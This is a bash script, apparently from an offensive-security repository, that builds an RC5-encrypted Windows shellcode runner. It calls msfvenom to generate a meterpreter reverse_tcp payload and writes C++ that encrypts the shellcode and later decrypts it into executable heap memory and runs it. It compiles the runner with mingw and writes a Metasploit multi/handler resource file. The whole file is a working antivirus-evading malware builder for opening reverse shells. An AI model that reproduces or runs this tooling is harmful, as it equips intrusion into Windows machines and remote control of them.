#!/bin/bash
help_menu_func(){
pygmentize -l csh <<eof
---------------------------------------------------------------------------
{!}w{!} RC5 Encryptd Windows Shellcode Runner Smol Builder {!}w{!}
---------------------------------------------------------------------------
# FAiled Tool...
* some working version of this is somewhere but not sure where it went...
---------------------------------------------------------------------------
# Comamnd Line Options:
__________________________________________________________________________
-p // LpORT port number of attacker for msfvenom
-l // Lhost ip-addr or network interface of attacker for msfvenom
-m // Msfvenom payload to use
-b // Bad Bytes to filter out of the final msf payload
-e // Type of exitfunc to use
__________________________________________________________________________
-d // Use Default Payload Options msfvenom: $msf || $lhost:$lport
-a // Arch of Payload || { x64, 64 } 0r {x86, 32} ([ Default: 64_Bit ])
-g // Powershell-Empire raw shellcode or another place instead of msfvenom
-w // Weapon file of a payload that is in (Hex Format): C or Csharp
__________________________________________________________________________
-k // Set a different RC5 Encryption key to use instead of the default 'SuperKey1345!'
__________________________________________________________________________
-o // Final compiled exe filename
-s // Save the keep_files_dir for review or debugging
-t // Tools Check
-h // Print Help menu
--------------------------------------------------------------------------
# Heap RC5 Encrypt Ratoon V2 Examples
0. Print Help Menu or Tools Check
	$0
	$0 -h
	$0 -t

2. Create RC5 encrypted payload with all default 'MSF-Venom' options
	$0 -d
	$0 -d -e thread -b '\x00\x0a' -p 1337

3. Create RC5 encrypted payload with raw shellcode bytes
	$0 -g shellcode.bin
	$0 -g shellcode.bin -a 32

4. Create RC5 encrypted payload with a weapon file human readable hex.txt
	$0 -w csharp_stager.txt

5. Save the output directory so you can debug the C++ Code with 'MSF' options
	$0 -d -s
eof
exit 1
}
#-------------------------------------------------------------------------------------
tools_check(){
	tools=("msfvenom" "x86_64-w64-mingw32-g++" "i686-w64-mingw32-g++" "g++" "xxd" "sed" "grep" )
	echo ''
	for tool in "${tools[@]}"; do
		if command -v "$tool" >/dev/null 2>&1;then
			echo "${green}$tool ${reset}is already installed."
		else
			echo "${red}$tool ${reset}needs to be installed."
		fi
	done
	exit 0
}
#-------------------------------------------------------------------------------------
make_save_dir(){
if [ -d "$save_dir" ]; then
	echo -e "${green}[+] ${reset}Directory $save_dir already exists\n"
else
	echo -e "${green}[+] ${reset}Directory $save_dir does not exist. Creating it...\n"
	mkdir $save_dir
fi
}
#-------------------------------------------------------------------------------------
msf_builder(){
	msfvenom -p $msf lhost=$lhost lport=$lport exitfunc=$exitfunc -f csharp -o ./$save_dir/msf.txt
	cs_payload_hex=$(cat ./$save_dir/msf.txt | grep -oE '0x[0-9A-Fa-f]{2}'|sed ':a;N;$!ba;s/\n/,/g'|tr -d '\n')
	echo -e "\n${green}[+] ${reset}MSF payload created\n"
}
#-------------------------------------------------------------------------------------
msf_handler(){
	echo -e "${green}[+] ${reset}Crafted simple msfconsole multi/handler resource file\n"
	echo -e "msfconsole -r ${red}msf_handler.rc${reset}\n"
	cat <<eof | tee msf_handler.rc
use exploit/multi/handler
set lhost $lhost
set lport $lport
set payload $msf
set exitfunc $exitfunc
run -j
eof
}
#-------------------------------------------------------------------------------------
weapon_file_formatter(){
    weapon_file_check=$1
    # Check if the file exists and is readable
    if [[ ! -f "$weapon_file_check" || ! -r "$weapon_file_check" ]]; then
        echo "Error: File '$weapon_file_check' does not exist or is not readable."
        exit 1
    fi
    file_check_sc=$(cat "$weapon_file_check")

    if grep -q '\\x' <<< "$file_check_sc"; then
        # File is in C++ format (\x00\x12)
        cs_payload_hex=$(echo -n "$file_check_sc" | grep -oE '\\x[0-9A-Fa-f]{2}' | sed 's/\\x/0x/g' | tr '\n' ',' | sed 's/,$//')
        #echo "$cs_payload_hex"
    elif grep -q '0x' <<< "$file_check_sc"; then
        # File is in C# format (0x00,0x12)
        cs_payload_hex=$(echo -n "$file_check_sc" | grep -oE '0x[0-9A-Fa-f]{2}' | tr '\n' ',' | sed 's/,$//')
        #echo "$cs_payload_hex"
    else
        echo "Error: Invalid shellcode format in file '$weapon_file'."
        exit 1
    fi
    echo -e "${green}[+] ${reset}Weapon file option used. Done formatting Org payload\n"
}
#-------------------------------------------------------------------------------------
grunt_formatter(){
	grunt_bin=$(xxd -i $grunt_bin_file)
	cs_payload_hex=$(echo -n "$grunt_bin"|grep -oE '0x[0-9A-Fa-f]{2}'|sed ':a;N;$!ba;s/\n/,/g'|tr -d '\n')
	echo -e "${green}[+] ${reset}Another Framework Raw ShellCode Payload has been formated correctly\n"
}
#-------------------------------------------------------------------------------------
builder(){
fix_rc5_key_array=$(printf "'%s'," $(echo -n "$rc5_key" | grep -o .) | sed 's/,$//')
#_________________________________________________________________
cat <<eof > ./$save_dir/encrypt_rc5.cpp
#include <iostream>
#include <vector>
#include <cstdint>
#include <cstring>
constexpr uint64_t W = 64;
constexpr uint64_t R = 20;
constexpr uint64_t P = 0xB7E151628AED2A6B; // Derived from e for 64-bit word size
constexpr uint64_t Q = 0x9E3779B97F4A7C15; // Derived from phi for 64-bit word size

uint64_t rotate_left(uint64_t x, uint64_t y) {
    y %= W;
    return (x << y) | (x >> (W - y));
}
uint64_t rotate_right(uint64_t x, uint64_t y) {
    y %= W;
    return (x >> y) | (x << (W - y));
}
std::vector<uint64_t> generate_key_schedule(const std::vector<unsigned char>& key) {
    size_t c = (key.size() + 7) / 8; // Number of 64-bit words in the key
    std::vector<uint64_t> L(c, 0);
    for (size_t i = 0; i < key.size(); ++i) {
        L[i / 8] |= static_cast<uint64_t>(key[i]) << (8 * (i % 8));
    }
    size_t t = 2 * R + 2; // Number of subkeys
    std::vector<uint64_t> S(t, 0);
    S[0] = P;
    for (size_t i = 1; i < t; ++i) {
        S[i] = S[i - 1] + Q;
    }
    size_t iterations = 3 * std::max(c, t);
    uint64_t A = 0, B = 0;
    size_t i = 0, j = 0;
    for (size_t k = 0; k < iterations; ++k) {
        A = S[i] = rotate_left(S[i] + A + B, 3);
        B = L[j] = rotate_left(L[j] + A + B, (A + B) % W);
        i = (i + 1) % t;
        j = (j + 1) % c;
    }
    return S;
}
std::pair<uint64_t, uint64_t> rc5_encrypt(std::pair<uint64_t, uint64_t> block, const std::vector<uint64_t>& S) {
    uint64_t x = block.first + S[0];
    uint64_t y = block.second + S[1];
    for (size_t i = 1; i <= R; i++) {
        x = rotate_left(x ^ y, y % W) + S[2 * i];
        y = rotate_left(y ^ x, x % W) + S[2 * i + 1];
    }
    return {x, y};
}
std::vector<uint8_t> encrypt_shellcode(const std::vector<uint8_t>& shellcode, const std::vector<uint8_t>& key) {
    auto S = generate_key_schedule(key);
    std::vector<uint8_t> encrypted;
    for (size_t i = 0; i < shellcode.size(); i += 16) {
        uint64_t block1 = 0, block2 = 0;
        memcpy(&block1, &shellcode[i], std::min<size_t>(8, shellcode.size() - i));
        if (i + 8 < shellcode.size()) {
            memcpy(&block2, &shellcode[i + 8], std::min<size_t>(8, shellcode.size() - i - 8));
        }
        auto encrypted_block = rc5_encrypt({block1, block2}, S);
        encrypted.insert(encrypted.end(), reinterpret_cast<uint8_t*>(&encrypted_block.first),
                         reinterpret_cast<uint8_t*>(&encrypted_block.first) + 8);
        encrypted.insert(encrypted.end(), reinterpret_cast<uint8_t*>(&encrypted_block.second),
                         reinterpret_cast<uint8_t*>(&encrypted_block.second) + 8);
    }
    return encrypted;
}
int main() {
    // Placeholder for original shellcode
    std::vector<uint8_t> shellcode = {$cs_payload_hex};
    std::vector<uint8_t> key = {$fix_rc5_key_array};
    auto encrypted = encrypt_shellcode(shellcode, key);
    for (size_t i = 0; i < encrypted.size(); ++i) {
        std::cout << "0x" << std::hex << (int)encrypted[i];
        if (i != encrypted.size() - 1) {
            std::cout << ",";
        }
    }
    std::cout << std::endl;
    return 0;
}
eof
echo "${green}[+] ${reset}encrypt_rc5.cpp has been made"
#_________________________________________________________________
g++ ./$save_dir/encrypt_rc5.cpp -o ./$save_dir/rc5.out
chmod +x ./$save_dir/rc5.out
./$save_dir/rc5.out > ./$save_dir/just_enc_shellcode.txt
final_rc5_payload=$(cat ./$save_dir/just_enc_shellcode.txt)
echo "${green}[+] ${reset}Encrypted the shellcode"
#_________________________________________________________________
cat <<eof > ./$save_dir/decrypt_rc5.cpp
#include <windows.h>
#include <vector>
#include <cstdint>
#include <cstring>
#include <iostream>

constexpr uint64_t W = 64;
constexpr uint64_t R = 20;
constexpr uint64_t P = 0xB7E151628AED2A6B; // Derived from e for 64-bit word size
constexpr uint64_t Q = 0x9E3779B97F4A7C15; // Derived from phi for 64-bit word size

uint64_t rotate_left(uint64_t x, uint64_t y) {
    y %= W;
    return (x << y) | (x >> (W - y));
}
uint64_t rotate_right(uint64_t x, uint64_t y) {
    y %= W;
    return (x >> y) | (x << (W - y));
}
std::vector<uint64_t> generate_key_schedule(const std::vector<uint8_t>& key) {
    size_t c = (key.size() + 7) / 8; // Number of 64-bit words in the key
    std::vector<uint64_t> L(c, 0);
    for (size_t i = 0; i < key.size(); ++i) {
        L[i / 8] |= static_cast<uint64_t>(key[i]) << (8 * (i % 8));
    }
    size_t t = 2 * R + 2; // Number of subkeys
    std::vector<uint64_t> S(t, 0);
    S[0] = P;
    for (size_t i = 1; i < t; ++i) {
        S[i] = S[i - 1] + Q;
    }
    size_t iterations = 3 * std::max(c, t);
    uint64_t A = 0, B = 0;
    size_t i = 0, j = 0;
    for (size_t k = 0; k < iterations; ++k) {
        A = S[i] = rotate_left(S[i] + A + B, 3);
        B = L[j] = rotate_left(L[j] + A + B, (A + B) % W);
        i = (i + 1) % t;
        j = (j + 1) % c;
    }

    return S;
}
std::pair<uint64_t, uint64_t> rc5_decrypt(std::pair<uint64_t, uint64_t> block, const std::vector<uint64_t>& S) {
    uint64_t x = block.first;
    uint64_t y = block.second;
    for (size_t i = R; i >= 1; --i) {
        y = rotate_right(y - S[2 * i + 1], x % W) ^ x;
        x = rotate_right(x - S[2 * i], y % W) ^ y;
    }
    x -= S[0];
    y -= S[1];
    return {x, y};
}
std::vector<uint8_t> decrypt_shellcode(const std::vector<uint8_t>& encrypted, const std::vector<uint8_t>& key) {
    auto S = generate_key_schedule(key);
    std::vector<uint8_t> decrypted;
    for (size_t i = 0; i < encrypted.size(); i += 16) {
        uint64_t block1 = 0, block2 = 0;
        memcpy(&block1, &encrypted[i], std::min<size_t>(8, encrypted.size() - i));
        if (i + 8 < encrypted.size()) {
            memcpy(&block2, &encrypted[i + 8], std::min<size_t>(8, encrypted.size() - i - 8));
        }
        auto decrypted_block = rc5_decrypt({block1, block2}, S);
	decrypted.insert(decrypted.end(), reinterpret_cast<uint8_t*>(&decrypted_block.first),
                         reinterpret_cast<uint8_t*>(&decrypted_block.first) + 8);
        decrypted.insert(decrypted.end(), reinterpret_cast<uint8_t*>(&decrypted_block.second),
                         reinterpret_cast<uint8_t*>(&decrypted_block.second) + 8);
    }
    return decrypted;
}
int main() {
    unsigned char MuskyHusky[] = {$final_rc5_payload};
    std::vector<uint8_t> encrypted(MuskyHusky, MuskyHusky + sizeof(MuskyHusky));
    std::vector<uint8_t> key = {$fix_rc5_key_array};
    auto decrypted = decrypt_shellcode(encrypted, key);

    HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    if (hHeap == NULL) {
        std::cerr << "Heap creation failed!" << std::endl;
        return 1;
    }
    LPVOID MuskyHuskyAddress = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, decrypted.size());
    if (MuskyHuskyAddress == NULL) {
        std::cerr << "Memory allocation failed!" << std::endl;
        HeapDestroy(hHeap);
        return 1;
    }
    memcpy(MuskyHuskyAddress, decrypted.data(), decrypted.size());
    DWORD oldProtect;
    if (!VirtualProtect(MuskyHuskyAddress, decrypted.size(), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        std::cerr << "Failed to change memory protection!" << std::endl;
        HeapFree(hHeap, 0, MuskyHuskyAddress);
        HeapDestroy(hHeap);
        return 1;
    }
    void (*func)() = (void (*)())MuskyHuskyAddress;
    func();

    HeapFree(hHeap, 0, MuskyHuskyAddress);
    HeapDestroy(hHeap);
    return 0;
}
eof
echo "${green}[+] ${reset}Saved decrypted runner decrypt_rc5.cpp file"
#____________________________________________________________________________
if [[ $arch == "x64" ]] || [[ $arch == "64" ]]
then
x86_64-w64-mingw32-g++ ./$save_dir/decrypt_rc5.cpp -o $out_exe_name -static -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
elif [[ $arch == "x86" ]] || [[ $arch == "32" ]]
then
i686-w64-mingw32-g++ ./$save_dir/decrypt_rc5.cpp -o $out_exe_name -static -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
else
	echo -n "Sorry Wrong Arch Var was used"
	exit 1
fi
echo -e "${green}[+] ${reset}Compile Final Payload EXE: $out_exe_name\n"
#-------------------------------------------------------------------------------------
if [[ $save_dir_check == 'no' ]];then
	rm -rf ./$save_dir
	echo "${red}[!] ${reset}The $save_dir directory has been removed"
else
	echo "${green}[+] ${reset}The $save_dir directory has been saved for debugging"
    fi
}
#-------------------------------------------------------------------------------------
green=$(tput setaf 2)
red=$(tput setaf 1)
reset=$(tput sgr0)
#-----------------------------------------
# ChangeMe-Key
rc5_key='SuperKey1345!'
msf="windows/x64/meterpreter/reverse_tcp"
# ChangeMe-Port
lport="8443"
# ChangeMe-IP
lhost="127.0.0.1"
badbytes=''
exitfunc="process"
out_exe_name="hr_v2.exe"
d_check="no"
tools_check_var="no"
save_dir_check="no"
save_dir="keep_files_dir"
grunt_bin=''
weapon_file=''
arch="x64"
#------------------------
if [ -z "$1" ]; then
	help_menu_func
fi
while [[ "$#" -gt 0 ]]
do
    case "$1" in
        -p) lport=$2;;
        -l) lhost=$2;;
        -m) msf=$2;;
        -b) badbytes=$2;;
        -e) exitfunc=$2;;
        -d) default=$2;;
        -o) out_exe_name=$2;;
        -g) grunt_bin_file=$2;;
        -w) weapon_file=$2;;
        -s) save_dir_check=$2;;
        -k) rc5_key=$2;;
	-t) tools_check_var=$2;;
        -h) help_menu_func
    esac
    shift
done
if [[ $tools_check_var != 'no' ]];then
    tools_check
fi
if [[ $grunt_bin_file == '' ]] && [[ $weapon_file == '' ]];then
    make_save_dir
    msf_builder
    builder
    msf_handler
fi
if [[ $grunt_bin_file != '' ]];then
    make_save_dir
    grunt_formatter
    builder
fi
if [[ $weapon_file != '' ]];then
    make_save_dir
    weapon_file_formatter $weapon_file
    builder
fi
